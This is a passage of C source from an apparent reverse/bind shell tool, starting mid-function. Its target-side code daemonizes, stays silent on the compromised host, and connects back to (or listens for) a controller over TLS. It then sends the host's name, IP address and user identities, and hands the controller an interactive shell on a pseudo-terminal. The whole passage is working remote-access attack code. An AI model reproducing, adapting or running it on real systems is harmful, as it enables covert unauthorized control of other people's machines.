					}
					buff_ptr += retval;
				}
			}

			free(rc_path_head);
			close(rc_fd);
		}


		errno = 0;

		// - Enter broker() for data brokering.
		if((retval = broker(&io) == -1)){
			print_error(&io, "%s: %d: broker(%lx): %s\r\n", \
					program_invocation_short_name, io.controller, (unsigned long) &io,
					strerror(errno));
		}

		err_flag = 0;
		if(errno == ECONNRESET){
			err_flag = errno;
		}

		// - Reset local term.
		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios_attrs);

		// - Exit.
		if(!err_flag){
			printf("Good-bye!\n");

		}else{
			while((retval = io.remote_read(&io, buff_head, buff_len)) > 0){
				write(STDERR_FILENO, buff_head, retval);
			}
		}
		if(io.encryption){
			SSL_shutdown(io.ssl);
			SSL_free(io.ssl);
			SSL_CTX_free(io.ctx);
		}else{
			BIO_free(io.connect);
		}

		free(buff_head);
		return(0);



		/*
		 * Target: 
		 * - Become a daemon.
		 * - Setup SSL.
		 * - Open a network connection back to a controller.
		 * - Receive and set the shell.
		 * - Receive and set the initial environment.
		 * - Receive and set the initial termios.
		 * - Create a pseudo-terminal (pty).
		 * - Send basic information back to the controller about the connecting host.
		 * - Fork a child to run the shell.
		 * - Parent: Enter the broker() and broker data.
		 * - Child: Initialize file descriptors.
		 * - Child: Set the pty as controlling.
		 * - Child: Call execve() to invoke a shell.
		 */
	}else{

		// Note: We will make heavy use of #ifdef DEBUG here. I don't want to *ever* print to the
		// remote host. We can do so if debugging, but otherwise just fail silently. Once the 
		// connection is open, we will try to shove errors down the socket, but otherwise fail
		// silently.

#ifndef DEBUG

		// - Become a daemon.
		umask(0);

		retval = fork();


		if(retval == -1){
			error(-1, errno, "fork()");
		}else if(retval){
			exit(0);
		}

		if((retval = setsid()) == -1){
			error(-1, errno, "setsid()");
		}

		if((retval = chdir("/")) == -1){
			error(-1, errno, "chdir(\"/\")");
		}

#endif

		// - Setup SSL.
		if(io.encryption){

			if((io.ctx = SSL_CTX_new(TLSv1_client_method())) == NULL){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_client_method()): %s\n", \
						program_invocation_short_name, io.controller, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			// Because the controller host will normally dictate which crypto to use, in bind shell mode
			// we will want to restrict this to only EDH from the target host. Otherwise the bind shell may
			// serve a shell to any random hacker that knows how to port scan.
			if(bindshell){
				cipher_list = CONTROLLER_CIPHER;
			}else{
				cipher_list = TARGET_CIPHER;
			}

			if(SSL_CTX_set_cipher_list(io.ctx, cipher_list) != 1){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.ctx, cipher_list, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			SSL_CTX_set_verify(io.ctx, SSL_VERIFY_PEER, dummy_verify_callback);

			if((retval = SSL_CTX_use_certificate_ASN1(io.ctx, target_certificate_len, target_certificate)) != 1){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_use_certificate_ASN1(%lx, %d, %lx): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.ctx, target_certificate_len, (unsigned long) target_certificate, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if((retval = SSL_CTX_use_RSAPrivateKey_ASN1(io.ctx, target_private_key, target_private_key_len)) != 1){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_use_RSAPrivateKey_ASN1(%lx, %lx, %d): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.ctx, (unsigned long) target_private_key, target_private_key_len, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if((retval = SSL_CTX_check_private_key(io.ctx)) != 1){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_check_private_key(%lx): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.ctx, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}
		}

		act.sa_handler = catch_alarm;

		if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
					program_invocation_short_name, io.controller, \
					SIGALRM, (unsigned long) &act, NULL, strerror(errno));
#endif
			exit(-1);
		}

		alarm(timeout);

		if(bindshell){
			// - Listen for a connection.

			if(keepalive){
				if(signal(SIGCHLD, SIG_IGN) == SIG_ERR){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: signal(SIGCHLD, SIG_IGN): %s\n", \
							program_invocation_short_name, io.controller, strerror(errno));
#endif
					exit(-1);
				}
			}

			do{
#ifdef DEBUG
				printf("Listening on %s...", buff_head);
				fflush(stdout);
#endif

				if(accept){
					BIO_free(accept);
					alarm(timeout);
				}

				if((accept = BIO_new_accept(buff_head)) == NULL){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
							program_invocation_short_name, io.controller, buff_head, strerror(errno));
					ERR_print_errors_fp(stderr);
#endif
					exit(-1);
				}

				if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
							program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
					ERR_print_errors_fp(stderr);
#endif
					exit(-1);
				}

				if(BIO_do_accept(accept) <= 0){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
							program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
					ERR_print_errors_fp(stderr);
#endif
					exit(-1);
				}

				if(BIO_do_accept(accept) <= 0){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
							program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
					ERR_print_errors_fp(stderr);
#endif
					exit(-1);
				}

				if((io.connect = BIO_pop(accept)) == NULL){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
							program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
					ERR_print_errors_fp(stderr);
#endif
					exit(-1);
				}

				BIO_free(accept);

				retval = 0;
				if(keepalive){
					if((retval = fork()) == -1){
#ifdef DEBUG
						fprintf(stderr, "%s: %d: fork(): %s\n", \
								program_invocation_short_name, io.controller, strerror(errno));
						ERR_print_errors_fp(stderr);
#endif
						exit(-1);
					}
				}

			} while(keepalive && retval);

			if(keepalive){
				if(signal(SIGCHLD, SIG_DFL) == SIG_ERR){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: signal(SIGCHLD, SIG_IGN): %s\n", \
							program_invocation_short_name, io.controller, strerror(errno));
#endif
					exit(-1);
				}
			}


		}else{

			// - Open a network connection back to a controller.
			if((io.connect = BIO_new_connect(buff_head)) == NULL){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
						program_invocation_short_name, io.controller, buff_head, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}


#ifdef DEBUG
			printf("Connecting to %s...", buff_head);
			fflush(stdout);
#endif
			while(((retval = BIO_do_connect(io.connect)) != 1) && retry_start){

				// Using RAND_pseudo_bytes() instead of RAND_bytes() because this is a best effort. We don't
				// actually want to die or print an error if there is a lack of entropy.
				if(retry_stop){
					RAND_pseudo_bytes((unsigned char *) &tmp_ulong, sizeof(tmp_ulong));
					retry = retry_start + (tmp_ulong % (retry_stop - retry_start));
				}else{
					retry = retry_start;
				}

#ifdef DEBUG
				printf("No connection.\r\nRetrying in %ld seconds...\r\n", retry);
#endif
				req.tv_sec = retry;
				nanosleep(&req, NULL);
#ifdef DEBUG
				printf("Connecting to %s...", buff_head);
				fflush(stdout);
#endif
			}

			if(retval != 1){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.connect, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}
		}

		act.sa_handler = SIG_DFL;

		if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
					program_invocation_short_name, io.controller, \
					SIGALRM, (unsigned long) &act, NULL, strerror(errno));
#endif
			exit(-1);
		}

		alarm(0);

#ifdef DEBUG
		printf("\tConnected!\r\n");
#endif

		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
#ifdef DEBUG
			fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) io.connect, (unsigned long) &(io.remote_fd), strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(io.encryption > PLAINTEXT){

			if(!(io.ssl = SSL_new(io.ctx))){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.ctx, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			SSL_set_bio(io.ssl, io.connect, io.connect);

			if((retval = SSL_connect(io.ssl)) < 1){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: SSL_connect(%lx): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.ssl, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if((current_cipher = SSL_get_current_cipher(io.ssl)) == NULL){
#ifdef DEBUG
				fprintf(stderr, "%s: %d: SSL_get_current_cipher(%lx): No cipher set!\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.ssl);
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if(!strcmp(current_cipher->name, EDH_CIPHER)){

				if((remote_cert = SSL_get_peer_certificate(io.ssl)) == NULL){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: SSL_get_peer_certificate(%lx): %s\n", \
							program_invocation_short_name, io.controller, (unsigned long) io.ssl, strerror(errno));
					ERR_print_errors_fp(stderr);
#endif
					exit(-1);
				}

				if(!X509_digest(remote_cert, fingerprint_type, remote_fingerprint, &remote_fingerprint_len)){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
							program_invocation_short_name, io.controller, \
							(unsigned long) remote_cert, \
							(unsigned long) fingerprint_type, \
							(unsigned long) remote_fingerprint, \
							(unsigned long) &remote_fingerprint_len, \
							strerror(errno));
					ERR_print_errors_fp(stderr);
#endif
					exit(-1);
				}

				if((remote_fingerprint_str = (char *) calloc(strlen(controller_fingerprint_str) + 1, sizeof(char))) == NULL){
#ifdef DEBUG
					fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
							program_invocation_short_name, io.controller, (int) strlen(controller_fingerprint_str) + 1, (int) sizeof(char), \
							strerror(errno));
#endif
					exit(-1);
				}

				for(i = 0; i < (int) remote_fingerprint_len; i++){
					sprintf(remote_fingerprint_str + (i * 2), "%02x", remote_fingerprint[i]);
				}

				if(strncmp(controller_fingerprint_str, remote_fingerprint_str, strlen(controller_fingerprint_str))){
#ifdef DEBUG
					fprintf(stderr, "Remote fingerprint expected:\n\t%s\n", controller_fingerprint_str);
					fprintf(stderr, "Remote fingerprint received:\n\t%s\n", remote_fingerprint_str);
					fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
							program_invocation_short_name, io.controller);
#endif
					exit(-1);
				}

				free(remote_fingerprint_str);
			}
		}

		// - Receive and set the shell.
		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, %d): %s\r\n", \
					program_invocation_short_name, io.controller, (unsigned long) &io, (unsigned long) &tmp_char, 1, strerror(errno));
			exit(-1);
		}

		if(tmp_char != (char) APC){
			print_error(&io, "%s: %d: invalid initialization: shell\r\n", program_invocation_short_name, io.controller);
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: Shell string too long.\r\n", \
						program_invocation_short_name, io.controller);
				exit(-1);
			}

			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
						program_invocation_short_name, io.controller, \
						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
				exit(-1);
			}
		}

		tmp_len = strlen(buff_head);
		if((shell = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
			print_error(&io, "%s: %d: calloc(%d, %d): %s\r\n", \
					program_invocation_short_name, io.controller, \
					tmp_len + 1, (int) sizeof(char), strerror(errno));
			exit(-1);
		}
		memcpy(shell, buff_head, tmp_len);


		// - Receive and set the initial environment.
		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		if(tmp_char != (char) APC){
			print_error(&io, "%s: %d: invalid initialization: environment\r\n", \
					program_invocation_short_name, io.controller);
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: Environment string too long.\r\n", \
						program_invocation_short_name, io.controller);
				exit(-1);
			}

			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
						program_invocation_short_name, io.controller, \
						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
				exit(-1);
			}
		}

		if((exec_envp = string_to_vector(buff_head)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
					program_invocation_short_name, io.controller, \
					buff_head, strerror(errno));
			exit(-1);
		}

		// - Receive and set the initial termios.
		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		if(tmp_char != (char) APC){
			print_error(&io, "%s: %d: invalid initialization: termios\r\n", \
					program_invocation_short_name, io.controller);
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: termios string too long.\r\n", \
						program_invocation_short_name, io.controller);
				exit(-1);
			}

			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
						program_invocation_short_name, io.controller, \
						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
				exit(-1);
			}
		}

		if((tmp_vector = string_to_vector(buff_head)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
					program_invocation_short_name, io.controller, \
					strerror(errno));
			exit(-1);
		}

		if(tmp_vector[0] == NULL){
			print_error(&io, "%s: %d: invalid initialization: tty_winsize.ws_row\r\n", \
					program_invocation_short_name, io.controller);
			exit(-1);
		}

		errno = 0;
		tty_winsize.ws_row = strtol(tmp_vector[0], NULL, 10);
		if(errno){
			print_error(&io, "%s: %d: strtol(%s): %s\r\n", \
					program_invocation_short_name, io.controller, \
					strerror(errno));
			exit(-1);
		}

		if(tmp_vector[1] == NULL){
			print_error(&io, "%s: %d: invalid initialization: tty_winsize.ws_col\r\n", \
					program_invocation_short_name, io.controller);
			exit(-1);
		}

		errno = 0;
		tty_winsize.ws_col = strtol(tmp_vector[1], NULL, 10);
		if(errno){
			print_error(&io, "%s: %d: strtol(%s): %s\r\n", \
					program_invocation_short_name, io.controller, \
					strerror(errno));
			exit(-1);
		}

		// - Create a pseudo-terminal (pty).
		if((pty_master = posix_openpt(O_RDWR|O_NOCTTY)) == -1){
			print_error(&io, "%s: %d: posix_openpt(O_RDWR|O_NOCTTY): %s\r\n", \
					program_invocation_short_name, io.controller, \
					strerror(errno));
			exit(-1);
		}

		if((retval = grantpt(pty_master)) == -1){
			print_error(&io, "%s: %d: grantpt(%d): %s\r\n", \
					program_invocation_short_name, io.controller, \
					pty_master, strerror(errno));
			exit(-1);
		}

		if((retval = unlockpt(pty_master)) == -1){
			print_error(&io, "%s: %d: unlockpt(%d): %s\r\n", \
					program_invocation_short_name, io.controller, \
					pty_master, strerror(errno));
			exit(-1);
		}

		if((retval = ioctl(pty_master, TIOCSWINSZ, &tty_winsize)) == -1){
			print_error(&io, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
					program_invocation_short_name, io.controller, \
					pty_master, TIOCGWINSZ, (unsigned long) &tty_winsize, strerror(errno));
			exit(-1);
		}

		if((pty_name = ptsname(pty_master)) == NULL){
			print_error(&io, "%s: %d: ptsname(%d): %s\r\n", \
					program_invocation_short_name, io.controller, \
					pty_master, strerror(errno));
			exit(-1);
		}

		if((pty_slave = open(pty_name, O_RDWR|O_NOCTTY)) == -1){
			print_error(&io, "%s: %d: open(%s, O_RDWR|O_NOCTTY): %s\r\n", \
					program_invocation_short_name, io.controller, \
					pty_name, strerror(errno));
			exit(-1);
		}

		// - Send basic information back to the controller about the connecting host.
		memset(buff_head, 0, buff_len);
		if((retval = gethostname(buff_head, buff_len - 1)) == -1){
			print_error(&io, "%s: %d: gethostname(%lx, %d): %s\r\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) buff_head, buff_len - 1, strerror(errno));
			exit(-1);
		}

		remote_printf(&io, "################################\r\n");
		remote_printf(&io, "# hostname: %s\r\n", buff_head);

		io.ip_addr = BIO_get_conn_ip(io.connect);
		if(io.ip_addr){
			remote_printf(&io, "# ip address: %d.%d.%d.%d\r\n", io.ip_addr[0], io.ip_addr[1], io.ip_addr[2], io.ip_addr[3]);
		}else if(!bindshell){
			remote_printf(&io, "# ip address: I have no address!\r\n");
		}

		// if the uid doesn't match an entry in /etc/passwd, we don't want to crash.
		// Borrowed the "I have no name!" convention from bash.
		passwd_entry = getpwuid(getuid());
		remote_printf(&io, "# real user: ");
		if(passwd_entry && passwd_entry->pw_name){
			remote_printf(&io, "%s", passwd_entry->pw_name);
		}else{
			remote_printf(&io, "I have no name!");
		}
		remote_printf(&io, "\r\n");

		passwd_entry = getpwuid(geteuid());
		remote_printf(&io, "# effective user: ");
		if(passwd_entry && passwd_entry->pw_name){
			remote_printf(&io, "%s", passwd_entry->pw_name);
		}else{
			remote_printf(&io, "I have no name!");
		}
		remote_printf(&io, "\r\n");

		remote_printf(&io, "################################\r\n");

		free(buff_head);

		if((retval = close(STDIN_FILENO)) == -1){
			print_error(&io, "%s: %d: close(STDIN_FILENO): %s\r\n", \
					program_invocation_short_name, io.controller, \
					strerror(errno));
			exit(-1);
		}

		if((retval = close(STDOUT_FILENO)) == -1){
			print_error(&io, "%s: %d: close(STDOUT_FILENO): %s\r\n", \
					program_invocation_short_name, io.controller, \
					strerror(errno));
			exit(-1);
		}

#ifndef DEBUG

		if((retval = close(STDERR_FILENO)) == -1){
			print_error(&io, "%s: %d: close(STDERR_FILENO): %s\r\n", \
					program_invocation_short_name, io.controller, \
					strerror(errno));
			exit(-1);
		}
#endif

		// - Fork a child to run the shell.
		retval = fork();

		if(retval == -1){
			print_error(&io, "%s: %d: fork(): %s\r\n", \
					program_invocation_short_name, io.controller, \
					strerror(errno));
			exit(-1);
		}

		if(retval){

			// - Parent: Enter the broker() and broker data.
			if((retval = close(pty_slave)) == -1){
				print_error(&io, "%s: %d: close(%d): %s\r\n", \
						program_invocation_short_name, io.controller, \
						pty_slave, strerror(errno));
				exit(-1);
			}

			io.local_fd = pty_master;

			retval = broker(&io);

			if((retval == -1)){
				print_error(&io, "%s: %d: broker(%lx): %s\r\n", \
						program_invocation_short_name, io.controller, \
						(unsigned long) &io, strerror(errno));
				exit(-1);
			}

			if(io.encryption){
				SSL_shutdown(io.ssl);
				SSL_free(io.ssl);
				SSL_CTX_free(io.ctx);
			}

			return(0);
		}

		// - Child: Initialize file descriptors.
		if((retval = close(pty_master)) == -1){
			print_error(&io, "%s: %d: close(%d): %s\r\n", \
					program_invocation_short_name, io.controller, \
					pty_master, strerror(errno));
			exit(-1);
		}
		if((retval = dup2(pty_slave, STDIN_FILENO)) == -1){
			print_error(&io, "%s: %d: dup2(%d, STDIN_FILENO): %s\r\n", \
					program_invocation_short_name, io.controller, \
					pty_slave, strerror(errno));
			exit(-1);
		}

		if((retval = dup2(pty_slave, STDOUT_FILENO)) == -1){
			print_error(&io, "%s: %d: dup2(%d, STDOUT_FILENO): %s\r\n", \
					program_invocation_short_name, io.controller, \
					pty_slave, strerror(errno));
			exit(-1);
		}

		if((retval = dup2(pty_slave, STDERR_FILENO)) == -1){
			print_error(&io, "%s: %d: dup2(%d, %d): %s\r\n", \
					program_invocation_short_name, io.controller, \
					pty_slave, STDERR_FILENO, strerror(errno));
			exit(-1);
		}

		if((retval = close(io.remote_fd)) == -1){
			print_error(&io, "%s: %d: close(%d): %s\r\n", \
					program_invocation_short_name, io.controller, \
					io.remote_fd, strerror(errno));
			exit(-1);
		}

		if((retval = close(pty_slave)) == -1){
			print_error(&io, "%s: %d: close(%d): %s\r\n", \
					program_invocation_short_name, io.controller, \
					pty_slave, strerror(errno));
			exit(-1);
		}

		if((retval = setsid()) == -1){
			print_error(&io, "%s: %d: setsid(): %s\r\n", \
					program_invocation_short_name, io.controller, \
					strerror(errno));
			exit(-1);
		} 

		// - Child: Set the pty as controlling.
		if((retval = ioctl(STDIN_FILENO, TIOCSCTTY, 1)) == -1){
			print_error(&io, "%s: %d: ioctl(STDIN_FILENO, TIOCSCTTY, 1): %s\r\n", \
					program_invocation_short_name, io.controller, \
					strerror(errno));
			exit(-1);
		}

		// - Child: Call execve() to invoke a shell.
		errno = 0;
		if((exec_argv = string_to_vector(shell)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
					program_invocation_short_name, io.controller, \
					shell, strerror(errno));
			exit(-1);
		}

		free(shell);

		execve(exec_argv[0], exec_argv, exec_envp);
		print_error(&io, "%s: %d: execve(%s, %lx, NULL): Shouldn't be here!\r\n", \
				program_invocation_short_name, io.controller, \
				exec_argv[0], (unsigned long) exec_argv);
		exit(-1);
	}

	return(-1);
}
